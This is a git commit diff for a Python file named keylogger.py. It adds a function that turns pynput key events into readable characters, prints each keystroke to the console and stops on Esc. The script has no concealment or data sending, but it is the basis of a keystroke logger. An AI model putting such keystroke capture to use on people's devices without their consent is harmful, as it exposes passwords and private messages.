8f8ee3cdf4dd96e844b1ee268c6b65e0f7bb566c
Styvensoft <steveen.echeverri@gmail.com>
2022-10-24 23:21:11 -0500

    Created func convert keys

--- keylogger.py
+++ keylogger.py
@@ -1,13 +1,22 @@
 import pynput.keyboard
 
 def press(key):
-    print("Tecla {}".format(key))
+    key1 = convertOne(key)
+    print("Tecla {}".format(key1))
 
 def release(key):
-    print("Tecla rel {}".format(key))
+    key1 = convertOne(key)
+    print("Tecla rel {}".format(key1))
 
-def convert():
-    pass
+    if str(key) == "Key.esc":
+        print("Exit...")
+        return False
+
+def convertOne(key):
+    if isinstance(key, pynput.keyboard.KeyCode):
+        return key.char
+    else:
+        return str(key)
 
 with pynput.keyboard.Listener(on_press=press, on_release=release) as listen:
     listen.join()
